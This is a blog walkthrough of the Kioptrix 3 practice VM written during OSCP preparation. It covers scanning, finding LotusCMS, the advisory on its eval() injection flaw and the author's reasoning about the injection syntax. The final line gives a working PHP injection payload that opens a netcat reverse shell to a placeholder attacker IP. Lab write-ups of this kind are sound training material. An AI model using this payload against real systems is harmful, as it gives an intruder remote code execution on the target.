---
layout: post
title: "Kioptrix 3 Walkthrough and Analysis"
description: A walkthrough and analysis of the methods involved in Kioptrix 3.
date: 2018-01-02
category: security
excerpt_separator: <!--more-->
image: /assets/images/cardimages/fingerprint.png
type: BlogPosting
---

To begin we start with a scan of the local network to obtain the VM IP using nmap 10.0.0.* -sP, piped to grep to cull the output.

![localscan](/assets/images/postimages/security/screenshots/local-ip-scan.png)

The -sP flag indicates a ping search of IPs 10.0.0.0-255.

Having found the IP, we'll run a preliminary TCP port scan. At this point I made the assumption that this box would only have TCP ports running but in later boxes, and definitely in the OSCP, I'll run the UDP scan as well. 

![nmapscan](/assets/images/postimages/security/screenshots/nmap-port-scan-kio-3.png)

The results are fairly bare - just an SSH port and a web server. I figured at this stage the vulnerability would be found in the browser so I ran OWASP ZAP over the IP. I knew tools such as Metasploit were limited in the OSCP, and tools such as Nessus were banned completely, however I wasn't aware of the limitation on OWASP ZAP. I'll ensure I don't use it in the future but regardless, it found a code injection vulnerability in the web application.

![codeinjectionvuln](/assets/images/postimages/security/screenshots/owaspcodeinjection.png)

After spending around an hour trying random input in the url with no progress, it became clear why these sorts of tools are banned in the exam. Had I enumerated properly from the beginning, I would have found countless explanations of the vulnerability. However, by relying on the scanner, there was no understanding of the vulnerability and so no way I would recognise the real entry or exploit it. Eventually I decided to explore the application further.

![loginpage](/assets/images/postimages/security/screenshots/kioptrix3login.png)

The above image clearly shows ```Proudly Powered by LotusCMS```. Googling LotusCMS vulnerability showed a clear explanation of the problem and the exploit, as well as several exploit scripts. Having found the exploit, it was important to understand what was going on. The problem was the way the CMS handled data directed straight to an eval() function on the php backend. Two exploit methods were described by the security researchers that discovered it.

>4) Description of Vulnerability
>
>Secunia Research has discovered two vulnerabilities in LotusCMS, which 
>can be exploited by malicious users and malicious people to compromise 
>a vulnerable system.
>
>1) Input passed via the "req" parameter to index.php (when system" is 
>set to "Modules", "page" is set to "admin", and "active" is set to 
>Menu") is not properly sanitised before being used in an "eval()" 
>call. This can be exploited to execute arbitrary PHP code.
>
>Successful exploitation of this vulnerability requires "editor" access.
>
>2) Input passed via the "page" parameter to index.php is not properly 
>sanitised in the "Router()" function in core/lib/router.php before 
>being used in an "eval()" call. This can be exploited to execute 
>arbitrary PHP code.
>
>Successful exploitation of this vulnerability requires that
>"magic_quotes_gpc" is disabled.


From the php documentation:
> syntax: eval ( string $code )
> evaluate a string as PHP code
> $code - **valid** php code to be executed. This includes that all statements must be properly terminated using a semicolon.  

So immediately it's clear that by using the system() function we can execute commands and potentially spawn a reverse shell. However, simply plugging ```system('ls')``` and escaped variations did nothing but produce parse errors. I wanted to figure this out without any assistance, however I eventually caved and found the vulnerability on exploit-db.com with the relevant metasploit module. Their full exploit URL was a POST request to /index.php with data ```/index.phppage=index');{payload};#```. 

How exactly it is being evaluated is unclear as I haven't seen the source code. However, if we input ```page=index');${system('ls')}#```, which produces the desired result, it may be evaluated as ```eval('index');${system('ls')};#');```. If this is the case, the unescaped ```'``` closes the eval function, allowing us to enter any php we'd like, and everything after the hash is ignored so php executes the two statements one after the other.
Removing the ```#``` to test the result produced parse errors and seemed to support my theory.
Regardless, the full exploit for a reverse shell is ```page=index');${system('nc -e /bin/sh <IP> <PORT>')};#```.